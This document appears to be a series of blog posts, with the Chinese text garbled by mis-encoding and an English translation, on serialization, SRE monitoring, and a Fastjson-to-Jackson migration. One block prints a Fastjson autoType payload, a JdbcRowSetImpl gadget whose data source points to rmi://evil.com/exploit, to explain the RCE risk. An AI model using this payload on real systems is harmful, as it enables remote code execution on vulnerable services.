ç¬¬ä¸€ç¯‡
----- Chinese
åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼šæ•°æ®çš„"å˜èº«æœ¯"ä¸SREçš„"ç«çœ¼é‡‘ç›" ğŸ­

å¤§å®¶å¥½ï¼ä»Šå¤©å’±ä»¬æ¥èŠèŠåºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿™å¯¹"æ¬¢å–œå†¤å®¶"ï¼Œä»¥åŠSREå°ä¼™ä¼´ä»¬å¦‚ä½•åœ¨è¿™åœºæ•°æ®å˜èº«ç§€ä¸­å½“å¥½"ç›‘å·¥"ï¼

1ï¸âƒ£ ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Ÿæ•°æ®çš„"æ‰“åŒ…"ä¸"æ‹†åŒ…"ä¹‹æ—… ğŸ“¦

ä»ç ”å‘è§’åº¦ï¼šæ•°æ®çš„"æ—…è¡Œå‡†å¤‡"
æƒ³è±¡ä¸€ä¸‹ï¼Œä½ çš„æ•°æ®å¯¹è±¡å°±åƒä¸€ä¸ªçˆ±æ—…è¡Œçš„èƒŒåŒ…å®¢ã€‚åœ¨å®¶é‡Œï¼ˆå†…å­˜ä¸­ï¼‰ï¼Œå®ƒå¯ä»¥ç©¿ç€ç¡è¡£ã€æ‹–é‹ï¼Œå„ç§èˆ’é€‚éšæ„ã€‚ä½†è¦å‡ºé—¨æ—…è¡Œï¼ˆç½‘ç»œä¼ è¾“ã€æ–‡ä»¶å­˜å‚¨ï¼‰ï¼Œæ€»ä¸èƒ½å…‰ç€èº«å­ä¸Šè·¯å§ï¼Ÿ

åºåˆ—åŒ–å°±æ˜¯ç»™æ•°æ®"æ‰“åŒ…è¡Œæ"ï¼š
- æŠŠå¤æ‚çš„å¯¹è±¡ç»“æ„å‹ç¼©æˆå­—èŠ‚æµ
- å°±åƒæŠŠç«‹ä½“çš„è¡£æœå æˆå¹³é¢æ”¾è¿›è¡Œæç®±
- æ–¹ä¾¿åœ¨ç½‘ç»œä¸­ä¼ è¾“ï¼Œæˆ–å­˜å‚¨åˆ°ç£ç›˜

ååºåˆ—åŒ–å°±æ˜¯"æ‹†åŒ…æ•´ç†"ï¼š
- æŠŠå­—èŠ‚æµé‡æ–°è¿˜åŸæˆå¯¹è±¡
- å°±åƒåˆ°äº†ç›®çš„åœ°æŠŠè¡£æœä»è¡Œæç®±æ‹¿å‡ºæ¥å±•å¼€
- è®©ç¨‹åºèƒ½é‡æ–°ä½¿ç”¨è¿™äº›æ•°æ®

å®é™…åº”ç”¨åœºæ™¯ï¼š
- å¾®æœåŠ¡é€šä¿¡ï¼šæœåŠ¡Aè¦æŠŠç”¨æˆ·ä¿¡æ¯å‘ç»™æœåŠ¡Bï¼Œå…ˆåºåˆ—åŒ–æ‰“åŒ…ï¼Œå†ååºåˆ—åŒ–æ‹†åŒ…
- ç¼“å­˜å­˜å‚¨ï¼šRedisé‡Œå­˜çš„éƒ½æ˜¯åºåˆ—åŒ–åçš„æ•°æ®ï¼Œå–å‡ºæ¥è¦ååºåˆ—åŒ–
- æ¶ˆæ¯é˜Ÿåˆ—ï¼šKafkaã€RabbitMQä¼ é€’çš„æ¶ˆæ¯éƒ½ç»è¿‡åºåˆ—åŒ–å¤„ç†
- æ•°æ®æŒä¹…åŒ–ï¼šæ•°æ®åº“å­˜å‚¨ã€æ–‡ä»¶ä¿å­˜éƒ½éœ€è¦åºåˆ—åŒ–

2ï¸âƒ£ ä½¿ç”¨æ—¶çš„"ç¿»è½¦ç°åœº"ï¼šå½“æ•°æ®å˜èº«å¤±è´¥ ğŸ’¥
ç ”å‘å¸¸è§çš„"å‘"ï¼š

ç‰ˆæœ¬å…¼å®¹æ€§é—®é¢˜ - "æ–°è¡£æœç©¿ä¸è¿›æ—§ç®±å­"ï¼šæ–°ç‰ˆæœ¬çš„å¯¹è±¡ç»“æ„å˜äº†ï¼Œæ—§ç‰ˆæœ¬çš„ä»£ç å°±ä¸è®¤è¯†äº†
æ€§èƒ½é—®é¢˜ - "æ‰“åŒ…å¤ªæ…¢ï¼Œå¿«é€’å˜èœ—ç‰›"
å†…å­˜æ³„æ¼ - "è¡Œæç®±å¿˜è®°å…³ï¼Œä¸œè¥¿æ‰ä¸€åœ°"
å¾ªç¯å¼•ç”¨ - "å¥—å¨ƒç°è±¡"ï¼Œåºåˆ—åŒ–è¿‡ç¨‹ä¸­å­˜åœ¨åµŒå¥—é¥®ç”¨

3ï¸âƒ£ SREè§†è§’çš„"ç›‘æ§ç—›ç‚¹"ï¼š
æ€§èƒ½ç›‘æ§éš¾é¢˜
- åºåˆ—åŒ–è€—æ—¶ä¸å¥½ç›´æ¥è§‚æµ‹
- ç»å¸¸è¢«åŒ…è£…åœ¨å…¶ä»–æ“ä½œä¸­
- é—®é¢˜å‘ç°æ—¶å·²ç»å½±å“ç”¨æˆ·ä½“éªŒ

é”™è¯¯å®šä½å›°éš¾
- ååºåˆ—åŒ–å¤±è´¥çš„é”™è¯¯ä¿¡æ¯å¾€å¾€å¾ˆæŠ½è±¡
- ç‰ˆæœ¬ä¸å…¼å®¹é—®é¢˜éš¾ä»¥å¿«é€Ÿå®šä½
- æ•°æ®æŸåå’Œä»£ç bugéš¾ä»¥åŒºåˆ†

4ï¸âƒ£ SREçš„"ç«çœ¼é‡‘ç›"ï¼šå¦‚ä½•ç›‘æ§åºåˆ—åŒ–é—®é¢˜ ğŸ‘ï¸
æ€§èƒ½ç›‘æ§ï¼šç»™æ•°æ®å˜èº«è®¡æ—¶

å…³é”®æŒ‡æ ‡ç›‘æ§ï¼šåºåˆ—åŒ–è€—æ—¶ã€æ•°æ®å¤§å°ã€æˆåŠŸç‡ç›‘æ§
å‘Šè­¦è§„åˆ™è®¾ç½®ï¼šåºåˆ—åŒ–è€—æ—¶è¿‡é•¿å‘Šè­¦ã€ååºåˆ—åŒ–å¤±è´¥ç‡è¿‡é«˜
æ—¥å¿—ç›‘æ§ç­–ç•¥ï¼šè®°å½•åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­çš„å¼‚å¸¸æ—¥å¿—


æ€»ç»“ï¼šåšå¥½æ•°æ®çš„"æ¬è¿å·¥" ğŸšš

åºåˆ—åŒ–å’Œååºåˆ—åŒ–å°±åƒæ•°æ®ä¸–ç•Œçš„"æ¬å®¶å…¬å¸"ï¼Œè´Ÿè´£æŠŠæ•°æ®ä»ä¸€ä¸ªåœ°æ–¹å®‰å…¨åœ°è¿åˆ°å¦ä¸€ä¸ªåœ°æ–¹ã€‚ç ”å‘åŒå­¦è¦é€‰å¥½"æ¬å®¶æ–¹å¼"ï¼ˆåºåˆ—åŒ–æ ¼å¼ï¼‰ï¼ŒSREåŒå­¦è¦å½“å¥½"è´¨æ£€å‘˜"ï¼Œç¡®ä¿æ¬å®¶è¿‡ç¨‹ä¸å‡ºå²”å­ã€‚

è®°ä½å‡ ä¸ªè¦ç‚¹ï¼š
- é€‰æ‹©åˆé€‚çš„åºåˆ—åŒ–æ ¼å¼ï¼šæ€§èƒ½å’Œå…¼å®¹æ€§è¦å¹³è¡¡
- åšå¥½ç‰ˆæœ¬ç®¡ç†ï¼šæ•°æ®ç»“æ„å˜æ›´è¦å‘åå…¼å®¹
- ç›‘æ§å…³é”®æŒ‡æ ‡ï¼šè€—æ—¶ã€æˆåŠŸç‡ã€æ•°æ®å¤§å°ä¸€ä¸ªéƒ½ä¸èƒ½å°‘
- å»ºç«‹å‘Šè­¦æœºåˆ¶ï¼šé—®é¢˜æ—©å‘ç°ï¼Œå½±å“æ—©æ§åˆ¶

æœ€åï¼Œåºåˆ—åŒ–è™½ç„¶æ˜¯ä¸ªæŠ€æœ¯æ´»ï¼Œä½†åˆ«å¿˜äº†å®ƒçš„æœ¬è´¨ï¼šè®©æ•°æ®èƒ½å¤Ÿ"è¯´èµ°å°±èµ°"çš„æ—…è¡Œï¼ğŸ’âœˆï¸

----- English

Serialization and Deserialization: Data's "Transformation Magic" and SRE's "Watchful Eyes" ğŸ­

Hello everyone! Today let's talk about serialization and deserialization, this pair of "frenemies," and how SRE professionals act as "watchful guardians" in this data transformation process!

1ï¸âƒ£ Why Serialize and Deserialize? Data's "Packing" and "Unpacking" Journey ğŸ“¦

From a Development Perspective: Data's "Travel Preparation"
Imagine your data objects are like travelers preparing for a journey. At home (in memory), they can be relaxed and unstructured, comfortable in their natural state. But when traveling (network transmission, file storage), they need proper packaging, right?

Serialization is "packing" for data:
- Converts complex object structures into byte streams
- Like carefully folding 3D items flat to fit in a suitcase
- Enables efficient network transmission and disk storage

Deserialization is "unpacking and reconstructing":
- Restores byte streams back into usable objects
- Like unpacking items at your destination and setting them up
- Allows programs to work with the data again

Real-world Application Scenarios:
- Microservice communication: Service A sends user info to Service B - serialize to transmit, deserialize to use
- Cache storage: Redis stores serialized data, requiring deserialization when retrieved
- Message queues: All messages in Kafka and RabbitMQ undergo serialization
- Data persistence: Database storage and file operations require serialization

2ï¸âƒ£ "Crash Scenes" During Usage: When Data Transformation Fails ğŸ’¥

Common Developer "Pitfalls":

Version Compatibility Issues - "New items won't fit in old containers": When object structures change in new versions, older code can't interpret them

Performance Issues - "Packing too slowly turns express delivery into snail mail"

Memory Leaks - "Forgetting to clean up after unpacking, leaving resources scattered"

Circular References - "Russian nesting doll problem" where objects reference each other in loops

3ï¸âƒ£ SRE Perspective "Monitoring Pain Points":

Performance Monitoring Challenges
- Serialization time is difficult to measure directly
- Often embedded within other operations
- Issues only surface after impacting user experience

Error Diagnosis Difficulties
- Deserialization failure messages are often cryptic
- Version incompatibility issues are hard to pinpoint quickly
- Challenging to distinguish between data corruption and code defects

4ï¸âƒ£ SRE's "Watchful Eyes": How to Monitor Serialization Issues ğŸ‘ï¸

Performance Monitoring: Measuring Data Transformations

Key Metrics to Track: Serialization duration, data payload size, success rates

Alert Configuration: Set alerts for slow serialization and high deserialization failure rates

Logging Strategy: Capture detailed logs for serialization and deserialization exceptions

```yaml
# Serialization performance monitoring
- alert: SerializationSlow
  expr: serialization_duration_seconds > 0.1
  annotations:
    summary: "Serialization taking longer than 100ms"

# Deserialization failure rate monitoring
- alert: DeserializationFailureHigh
  expr: deserialization_failure_rate > 0.01
  annotations:
    summary: "Deserialization failure rate exceeds 1%"
```

Summary: Being Effective Data "Logistics Coordinators" ğŸšš

Serialization and deserialization act like "logistics companies" in the data world, responsible for safely transporting data from one location to another. Developers must choose the right "shipping method" (serialization format), while SRE professionals serve as "quality inspectors," ensuring smooth operations throughout the process.

Key takeaways:
- Choose appropriate serialization formats: Balance performance with compatibility
- Manage versions carefully: Ensure data structure changes maintain backward compatibility
- Monitor critical metrics: Track timing, success rates, and payload sizes comprehensively
- Implement robust alerting: Enable early detection and rapid response to issues

Remember: while serialization involves technical complexity, its core purpose is simpleâ€”giving data the ability to "travel" seamlessly across systems! ğŸ’âœˆï¸

ç¬¬äºŒç¯‡ï¼šè½¯ä»¶å‡çº§çš„"è¡€æ³ªå²"ï¼ˆä¸Šï¼‰ï¼šæ•´ä¸ªå¤§æ´» ğŸ’£

å¤§å®¶å¥½ï¼ä»Šå¤©æ¥èŠèŠä¸€ä¸ªè®©æ— æ•°ç¨‹åºå‘˜"å¤´ç§ƒ"çš„è¯é¢˜â€”â€”è½¯ä»¶å‡çº§ï¼ç‰¹åˆ«æ˜¯é‚£ç§"ä¸å‡çº§ç­‰æ­»ï¼Œå‡çº§æ‰¾æ­»"çš„ç¬¬ä¸‰æ–¹åº“å‡çº§ã€‚æˆ‘è¦åˆ†äº«ä¸€ä¸ªäº²èº«ç»å†çš„çœŸå®æ¡ˆä¾‹ï¼šFastjsonåˆ°Jacksonçš„è¿ç§»ä¹‹è·¯ã€‚

1ï¸âƒ£ æ•…äº‹èƒŒæ™¯ï¼šå½“"è€æœ‹å‹"å˜æˆ"å®šæ—¶ç‚¸å¼¹" ğŸ’£

æ—¶é—´çº¿ï¼š2020å¹´å·¦å³
é‚£æ—¶å€™æˆ‘è¿˜æ˜¯ä¸ª"ç å†œ"ï¼Œä¸»è¦åšJavaå¼€å‘ã€‚å…¬å¸é¡¹ç›®é‡Œå¤§é‡ä½¿ç”¨Fastjsonä½œä¸ºJSONåºåˆ—åŒ–å·¥å…·ï¼Œç”¨äº†å¥½å‡ å¹´ï¼Œä¸€ç›´ç›¸å®‰æ— äº‹ã€‚

Fastjsonå½“æ—¶çš„"ä¼˜ç‚¹"ï¼š
- æ€§èƒ½è¶…å¿«ï¼Œå›½äº§ä¹‹å…‰ ğŸš€
- APIç®€å•ï¼Œä¸Šæ‰‹å®¹æ˜“
- é˜¿é‡Œå‡ºå“ï¼Œçœ‹èµ·æ¥å¾ˆé è°±
- é¡¹ç›®é‡Œåˆ°å¤„éƒ½åœ¨ç”¨

ç„¶åï¼Œå™©æ¢¦å¼€å§‹äº†...

å®‰å…¨æ¼æ´çˆ†å‘ï¼šååºåˆ—åŒ–RCE
2020å¹´å‰åï¼ŒFastjson 1.xçš„å®‰å…¨æ¼æ´å¼€å§‹å¯†é›†çˆ†å‘ï¼š
- ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„JSONæ‰§è¡Œä»»æ„ä»£ç 
- autoTypeç»•è¿‡ï¼šå„ç§ç»•è¿‡æ‰‹æ®µå±‚å‡ºä¸ç©·
- ä¼ä¸šå®‰å…¨æ‰«æï¼šå…¬å¸å®‰å…¨éƒ¨é—¨å¼€å§‹"æ•²è­¦é’Ÿ"

```json
// æ¶æ„JSONç¤ºä¾‹ï¼ˆç®€åŒ–ç‰ˆï¼‰
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "rmi://evil.com/exploit",
  "autoCommit": true
}
```

å…¬å¸å®‰å…¨éƒ¨é—¨çš„"æœ€åé€šç‰’"ï¼š
> "æ‰€æœ‰ä½¿ç”¨Fastjson 1.xçš„é¡¹ç›®ï¼Œå¿…é¡»åœ¨3ä¸ªæœˆå†…å®Œæˆå‡çº§ï¼Œå¦åˆ™ä¸å…è®¸ä¸Šçº¿ï¼"

2ï¸âƒ£ é€‰æ‹©å›°éš¾ç—‡ï¼šå‡çº§è¿˜æ˜¯è¿ç§»ï¼Ÿ ğŸ¤”

å½“æ—¶çš„æŠ€æœ¯é€‰æ‹©ï¼ˆ2020å¹´ï¼‰ï¼š

é€‰é¡¹1ï¼šç»§ç»­ç”¨Fastjson 1.x âŒ
- å®‰å…¨æ¼æ´æ— æ³•æ¥å—
- å·²ç»åŸºæœ¬åœæ­¢ç»´æŠ¤
- ä¼ä¸šåˆè§„ä¸å…è®¸

é€‰é¡¹2ï¼šè¿ç§»åˆ°Jackson âœ…
- ä¸šç•Œæ ‡å‡†ï¼Œå®‰å…¨ç¨³å®š
- ç¤¾åŒºæ´»è·ƒï¼ŒæŒç»­ç»´æŠ¤
- Spring Booté»˜è®¤é€‰æ‹©

é€‰é¡¹3ï¼šè¿ç§»åˆ°Gson ğŸ¤·â€â™‚ï¸
- ç›¸å¯¹å®‰å…¨ï¼Œä½†æ€§èƒ½è¾ƒæ…¢
- Googleå‡ºå“ï¼Œä½†æ›´æ–°é¢‘ç‡ä¸€èˆ¬

æœ€ç»ˆå†³å®šï¼šJacksonï¼

3ï¸âƒ£ è¿ç§»çš„"è¡€æ³ªå²"ï¼šä»£ç æ”¹åˆ°æ€€ç–‘äººç”Ÿ ğŸ˜­

å·¥ä½œé‡è¯„ä¼°ï¼šå¤©çœŸçš„å¼€å§‹
æœ€åˆä»¥ä¸ºå¾ˆç®€å•ï¼š
```java
// åŸæ¥çš„ä»£ç 
String json = JSON.toJSONString(user);
User user = JSON.parseObject(json, User.class);

// æ”¹æˆJackson
String json = objectMapper.writeValueAsString(user);
User user = objectMapper.readValue(json, User.class);
```

ç°å®ï¼šè¿™åªæ˜¯å†°å±±ä¸€è§’ï¼

APIå·®å¼‚ï¼šé­”é¬¼åœ¨ç»†èŠ‚é‡Œ

1. é…ç½®æ–¹å¼å®Œå…¨ä¸åŒ
```java
// Fastjsoné…ç½®
JSON.toJSONString(obj, SerializerFeature.WriteNullStringAsEmpty);

// Jacksoné…ç½®
ObjectMapper mapper = new ObjectMapper();
mapper.setSerializationInclusion(JsonInclude.Include.NON_NULL);
mapper.configure(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS, false);
```

2. æ³¨è§£ä½“ç³»ä¸å…¼å®¹
```java
// Fastjsonæ³¨è§£
@JSONField(name = "user_name", format = "yyyy-MM-dd")
private String userName;

// Jacksonæ³¨è§£
@JsonProperty("user_name")
@JsonFormat(pattern = "yyyy-MM-dd")
private String userName;
```

3. æ—¥æœŸå¤„ç†å·®å¼‚å·¨å¤§
```java
// Fastjsonï¼šè‡ªåŠ¨è¯†åˆ«å¤šç§æ ¼å¼
Date date = JSON.parseObject("\"2020-01-01\"", Date.class);

// Jacksonï¼šéœ€è¦æ˜ç¡®é…ç½®æ ¼å¼
SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
mapper.setDateFormat(sdf);
```

æ¶‰åŠçš„ä¸šåŠ¡æ¨¡å—ï¼šéåœ°å¼€èŠ±
- ç”¨æˆ·æœåŠ¡ï¼šç”¨æˆ·ä¿¡æ¯åºåˆ—åŒ–
- è®¢å•æœåŠ¡ï¼šè®¢å•æ•°æ®å¤„ç†
- æ”¯ä»˜æœåŠ¡ï¼šæ”¯ä»˜è®°å½•å­˜å‚¨
- æ¶ˆæ¯é˜Ÿåˆ—ï¼šMQæ¶ˆæ¯æ ¼å¼
- ç¼“å­˜å±‚ï¼šRedisæ•°æ®å­˜å‚¨
- APIæ¥å£ï¼šå‰åç«¯æ•°æ®äº¤äº’

ç»Ÿè®¡ç»“æœè®©äººç»æœ›ï¼š
- æ¶‰åŠæ–‡ä»¶ï¼š200+ ä¸ª
- éœ€è¦ä¿®æ”¹çš„ç±»ï¼š500+ ä¸ª
- å½±å“çš„æ¥å£ï¼š100+ ä¸ª
- å®é™…è€—æ—¶ï¼š2ä¸ªå¤šæœˆï¼

æ€»ç»“ï¼šå‡çº§çš„ç¬¬ä¸€æ­¥ï¼Œé€‰æ‹©å¾ˆå…³é”® ğŸ¯

è¿™æ¬¡è¿ç§»è®©æˆ‘æ·±åˆ»ä½“ä¼šåˆ°ï¼š
- æŠ€æœ¯é€‰å‹è¦è€ƒè™‘é•¿è¿œï¼šä¸èƒ½åªçœ‹å½“å‰æ€§èƒ½
- å®‰å…¨æ€§æ°¸è¿œç¬¬ä¸€ï¼šå†å¿«çš„åº“æœ‰æ¼æ´ä¹Ÿä¸èƒ½ç”¨
- å……åˆ†è¯„ä¼°å·¥ä½œé‡ï¼šè¿ç§»æˆæœ¬å¾€å¾€è¶…å‡ºé¢„æœŸ
- åšå¥½å¿ƒç†å‡†å¤‡ï¼šå‡çº§ä¹‹è·¯æ³¨å®šä¸å¹³å¦

ä¸‹ä¸€ç¯‡æˆ‘ä»¬ç»§ç»­èŠæµ‹è¯•å’Œç›‘æ§çš„"å™©æ¢¦"ï¼Œä»¥åŠè¡€çš„æ•™è®­... ğŸ˜…

ç¬¬ä¸‰ç¯‡ï¼šè½¯ä»¶å‡çº§çš„"è¡€æ³ªå²"ï¼ˆä¸‹ï¼‰ï¼šæµ‹è¯•ä¸ç›‘æ§çš„æ¼«æ¼«é•¿è·¯ ğŸ›¤ï¸

ç»§ç»­ä¸Šç¯‡çš„Fastjsonåˆ°Jacksonè¿ç§»æ•…äº‹ã€‚ä»£ç æ”¹å®Œäº†ï¼Œä»¥ä¸ºå¯ä»¥æ¾å£æ°”ï¼Ÿå¤ªå¤©çœŸäº†ï¼çœŸæ­£çš„"å™©æ¢¦"æ‰åˆšåˆšå¼€å§‹...

1ï¸âƒ£ æµ‹è¯•çš„"å™©æ¢¦"ï¼šæ¯ä¸ªè§’è½éƒ½å¯èƒ½æœ‰å‘ ğŸ•³ï¸

å•å…ƒæµ‹è¯•ï¼šå…¨éƒ¨é‡å†™
```java
// åŸæ¥çš„æµ‹è¯•
@Test
public void testSerialization() {
    User user = new User("å¼ ä¸‰", 25);
    String json = JSON.toJSONString(user);
    assertEquals("{\"name\":\"å¼ ä¸‰\",\"age\":25}", json);
}

// Jacksonçš„æµ‹è¯•ï¼ˆå­—æ®µé¡ºåºå¯èƒ½ä¸åŒï¼ï¼‰
@Test
public void testSerialization() {
    User user = new User("å¼ ä¸‰", 25);
    String json = objectMapper.writeValueAsString(user);
    // å­—æ®µé¡ºåºå¯èƒ½å˜åŒ–ï¼Œéœ€è¦ç”¨JsonNodeæ¯”è¾ƒ
    JsonNode expected = objectMapper.readTree("{\"name\":\"å¼ ä¸‰\",\"age\":25}");
    JsonNode actual = objectMapper.readTree(json);
    assertEquals(expected, actual);
}
```

é›†æˆæµ‹è¯•ï¼šå„ç§è¯¡å¼‚é—®é¢˜

é—®é¢˜1ï¼šæ—¥æœŸæ ¼å¼ä¸ä¸€è‡´
```java
// Fastjsonè¾“å‡ºï¼š2020-01-01 10:30:00
// Jacksonè¾“å‡ºï¼š2020-01-01T10:30:00.000+0000
// å‰ç«¯ç›´æ¥å´©æºƒï¼
```

é—®é¢˜2ï¼šnullå€¼å¤„ç†å·®å¼‚
```java
// Fastjsonï¼šnullå­—æ®µä¸è¾“å‡º
{"name": "å¼ ä¸‰", "age": 25}

// Jacksonï¼šnullå­—æ®µè¾“å‡ºä¸ºnull
{"name": "å¼ ä¸‰", "age": 25, "email": null}
// å‰ç«¯åˆå´©æºƒäº†ï¼
```

é—®é¢˜3ï¼šæ•°å­—ç²¾åº¦é—®é¢˜
- BigDecimalåºåˆ—åŒ–ç»“æœä¸åŒ
- é‡‘é¢è®¡ç®—å‡ºç°åå·®
- è´¢åŠ¡éƒ¨é—¨æ‰¾ä¸Šé—¨æ¥äº†ï¼ğŸ’°

é—®é¢˜4ï¼šæœåŠ¡é—´è°ƒç”¨å…¼å®¹æ€§
```java
// è°ƒç”¨å…¶ä»–æœåŠ¡çš„ä»£ç ä¹Ÿéœ€è¦ä¿®æ”¹
// åŸæ¥ç”¨Fastjsonè§£æå“åº”
String response = httpClient.call(otherService);
User user = JSON.parseObject(response, User.class);  // Fastjson

// ç°åœ¨è¦æ”¹æˆJackson
ObjectMapper mapper = new ObjectMapper();
User user = mapper.readValue(response, User.class);  // Jackson
// ä¸Šä¸‹æ¸¸æœåŠ¡éƒ½è¦åè°ƒæµ‹è¯•ï¼
```

QAæµ‹è¯•ï¼šä¸šåŠ¡åŠŸèƒ½çš„å…¨é¢ä½“æ£€ ğŸ¥

é›†æˆæµ‹è¯•é€šè¿‡åï¼Œè¿˜è¦é¢å¯¹QAå›¢é˜Ÿçš„"ç»ˆæå¤§è€ƒ"ï¼š

æµ‹è¯•èŒƒå›´æ‰©å¤§ï¼š
- ç«¯åˆ°ç«¯ä¸šåŠ¡æµç¨‹ï¼šå®Œæ•´çš„ç”¨æˆ·æ“ä½œé“¾è·¯éªŒè¯
- è·¨ç³»ç»Ÿæ•°æ®æµè½¬ï¼šå¤šä¸ªä¸šåŠ¡ç³»ç»Ÿé—´çš„æ•°æ®äº¤äº’æµ‹è¯•
- ç”¨æˆ·ç•Œé¢æµ‹è¯•ï¼šå‰ç«¯é¡µé¢æ˜¾ç¤ºæ˜¯å¦æ­£å¸¸

è‡ªåŠ¨åŒ–æµ‹è¯•æŒ‘æˆ˜ï¼š

åºåˆ—åŒ–åº“çš„æ›´æ¢ä¸ä»…å½±å“ä»£ç ï¼Œè¿˜ä¼šå½±å“æ•°æ®æ ¼å¼ï¼Œå¯¼è‡´è‡ªåŠ¨åŒ–æµ‹è¯•è„šæœ¬å¤§é‡å¤±æ•ˆï¼š

```bash
# åŸæ¥çš„è‡ªåŠ¨åŒ–æµ‹è¯•è„šæœ¬ä¹Ÿè¦æ›´æ–°
# å› ä¸ºAPIå“åº”æ ¼å¼å¯èƒ½å‘ç”Ÿå˜åŒ–
curl -X POST /api/user \
  -d '{"name":"å¼ ä¸‰","age":25}' \
  -H "Content-Type: application/json"

# å“åº”æ ¼å¼å˜äº†ï¼Œæ–­è¨€ä¹Ÿè¦æ”¹
# åŸæ¥ï¼š2020-01-01 10:30:00
# ç°åœ¨ï¼š2020-01-01T10:30:00.000+0000
```

ä¸»è¦æŒ‘æˆ˜ï¼šæ—¥æœŸæ ¼å¼ã€æ•°å­—ç²¾åº¦ã€nullå€¼å¤„ç†ç­‰ç»†å¾®å·®å¼‚ä¼šå¯¼è‡´æµ‹è¯•æ–­è¨€å¤±è´¥ï¼Œéœ€è¦é€ä¸€æ’æŸ¥å’Œä¿®å¤ã€‚

æ€§èƒ½å›å½’æµ‹è¯•ï¼š
- Jacksonæ€§èƒ½æ˜¯å¦æ»¡è¶³è¦æ±‚ï¼Ÿ
- å†…å­˜ä½¿ç”¨æ˜¯å¦æœ‰å¼‚å¸¸ï¼Ÿ
- å“åº”æ—¶é—´æ˜¯å¦åœ¨å¯æ¥å—èŒƒå›´ï¼Ÿ

æ•°æ®ä¸€è‡´æ€§éªŒè¯ï¼š
- å†å²æ•°æ®èƒ½å¦æ­£å¸¸è¯»å–ï¼Ÿ
- æ–°è€æ•°æ®æ ¼å¼æ˜¯å¦å…¼å®¹ï¼Ÿ
- æ•°æ®è¿ç§»æ˜¯å¦å®Œæ•´ï¼Ÿ

QAæµ‹è¯•å°±åƒç»™æ•´ä¸ªç³»ç»Ÿåš"å…¨èº«ä½“æ£€"ï¼Œä»»ä½•ä¸€ä¸ªç¯èŠ‚å‡ºé—®é¢˜éƒ½å¯èƒ½å¯¼è‡´å›æ»šé‡æ¥ï¼ğŸ˜°

2ï¸âƒ£ SREè§†è§’ï¼šå¦‚ä½•ç›‘æ§å‡çº§è¿‡ç¨‹ ğŸ‘ï¸

å‡çº§å‰çš„åŸºçº¿ç›‘æ§
```bash
# å»ºç«‹æ€§èƒ½åŸºçº¿
serialization_duration_baseline{library="fastjson"}
serialization_error_rate_baseline{service="user-service"}
```

å…¨é‡å‘å¸ƒç›‘æ§

å½“æ—¶é‡‡ç”¨çš„æ˜¯ä¼ ç»Ÿçš„å…¨é‡å‘å¸ƒæ¨¡å¼ï¼ˆä¸€æ¬¡æ€§æ•´ä½“æ›¿æ¢ï¼‰ï¼Œç›‘æ§ç­–ç•¥ï¼š

å‘å¸ƒå‰åŸºçº¿è®°å½•ï¼š
- å‡çº§å‰ä¸€å‘¨çš„å…³é”®æŒ‡æ ‡åŸºçº¿
- APIå“åº”æ—¶é—´ã€é”™è¯¯ç‡ã€å†…å­˜ä½¿ç”¨
- ä¸šåŠ¡æŒ‡æ ‡ï¼šè®¢å•æˆåŠŸç‡ã€ç”¨æˆ·æ´»è·ƒåº¦

å‘å¸ƒåç´§æ€¥ç›‘æ§ï¼š
```yaml
# å…³é”®å‘Šè­¦ï¼ˆè§¦å‘å›æ»šè€ƒè™‘ï¼‰
- alert: UpgradePerformanceDegraded
  expr: api_response_time > api_response_time_baseline * 2.0
  annotations:
    summary: "å‡çº§åå“åº”æ—¶é—´ä¸¥é‡æ¶åŒ–"

- alert: UpgradeErrorSpike
  expr: rate(http_requests_total{status=~"5.."}[5m]) > error_rate_baseline * 3.0
  annotations:
    summary: "å‡çº§åé”™è¯¯ç‡å¼‚å¸¸å‡é«˜"
```

å…¨é‡å‘å¸ƒçš„é£é™©ï¼šä¸€æ—¦å‡ºé—®é¢˜å½±å“100%ç”¨æˆ·ï¼Œæ‰€ä»¥ç›‘æ§å’Œå›æ»šå‡†å¤‡è‡³å…³é‡è¦ï¼

ä¸šåŠ¡æŒ‡æ ‡å…³è”
- æ¥å£å“åº”æ—¶é—´ï¼šå‡çº§å‰åå¯¹æ¯”
- ä¸šåŠ¡æˆåŠŸç‡ï¼šå…³æ³¨æ ¸å¿ƒä¸šåŠ¡æŒ‡æ ‡
- æ•°æ®ä¸€è‡´æ€§ï¼šæ–°è€æ ¼å¼å…¼å®¹æ€§æ£€æŸ¥

3ï¸âƒ£ è¡€çš„æ•™è®­ï¼šå‡çº§è·¯ä¸Šçš„å‘ ğŸ•³ï¸

æŠ€æœ¯å±‚é¢
- ä¸è¦è¿‡åº¦ä¾èµ–å•ä¸€æŠ€æœ¯æ ˆï¼šé¿å…æŠŠé¸¡è›‹æ”¾åœ¨ä¸€ä¸ªç¯®å­é‡Œ
- å®‰å…¨æ€§æ°¸è¿œç¬¬ä¸€ï¼šæ€§èƒ½å†å¥½ï¼Œæœ‰æ¼æ´ä¹Ÿä¸èƒ½ç”¨
- å‡çº§è¦è¶æ—©ï¼šå°ç‰ˆæœ¬å‡çº§æ¯”å¤§ç‰ˆæœ¬é‡æ„å®¹æ˜“

é¡¹ç›®ç®¡ç†å±‚é¢
- å……åˆ†è¯„ä¼°å·¥ä½œé‡ï¼šåˆæœŸè¯„ä¼°å¾€å¾€è¿‡äºä¹è§‚
- åˆ†é˜¶æ®µå®æ–½ï¼šå…ˆä»éæ ¸å¿ƒæ¨¡å—å¼€å§‹
- åšå¥½å›æ»šå‡†å¤‡ï¼šä¿ç•™åŸæœ‰ä»£ç åˆ†æ”¯

å›¢é˜Ÿåä½œå±‚é¢
- å……åˆ†æ²Ÿé€šï¼šè®©æ‰€æœ‰äººäº†è§£å‡çº§çš„å¿…è¦æ€§
- çŸ¥è¯†åˆ†äº«ï¼šæ•´ç†æ–‡æ¡£ï¼Œé¿å…é‡å¤è¸©å‘

æ€»ç»“ï¼šå‡çº§è™½ç—›è‹¦ï¼Œä½†å¿…é¡»é¢å¯¹ ğŸ’ª

